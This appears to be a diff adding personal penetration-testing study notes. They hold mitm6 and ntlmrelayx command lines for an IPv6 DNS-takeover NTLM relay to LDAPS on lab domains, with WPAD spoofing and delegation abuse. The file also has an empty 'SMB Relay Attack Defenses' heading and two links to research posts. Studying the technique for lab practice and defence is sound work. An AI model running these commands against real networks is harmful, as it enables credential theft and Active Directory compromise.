@@ -1,0 +1,24 @@
+
+python3 mitm6.py -d marvel.local
+ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
+
+mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
+ntlmrelayx.py -t ldaps://icorp-dc.internal.corp -wh attacker-wpad --delegate-access
+
+
+
+
+
+
+
+-- SMB Relay Attack Defenses --
+
+......
+......
+......
+......
+......
+
+
+https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
+https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
